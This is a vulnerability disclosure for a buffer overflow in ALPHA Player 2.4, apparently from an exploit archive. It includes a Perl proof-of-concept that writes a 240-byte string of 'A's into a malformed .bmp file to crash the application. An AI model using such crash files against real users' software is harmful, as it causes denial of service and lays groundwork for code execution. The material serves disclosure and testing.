source: https://www.securityfocus.com/bid/44196/info

ALPHA Player is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

ALPHA Player 2.4 is vulnerable; other versions may also be affected. 

===================================================
ALPHA 2 Player Local Crash PoC
===================================================
#Title: ALPHA 2 Player(.bmp) Local Crash PoC
#Author    :   anT!-Tr0J4n
#Email      :   D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com
#Greetz    :   Dev-PoinT.com ~ inj3ct0r.com  ~all DEV-PoinT t34m
#thanks    :   r0073r ; Sid3^effects ; L0rd CrusAd3r ; all Inj3ct0r 31337 Member
#Home     :   www.Dev-PoinT.com  $ http://inj3ct0r.com
#Tested on:   Windows XP sp3
# http://alpha2player.com/
==================================================
 
#!/usr/bin/perl
print "| ALPHA.bmp Local Crash |\n";
print "| Author: anT!-Tr0J4n      |\n";
print "| Greetz :http://inj3ct0r.com     |\n";
print "| www.Dev-PoinT.com  |\n";
 
 
my $junk= "\x41" x 240 ;
open(file,">crash.bmp");
print file $junk ;
close(file);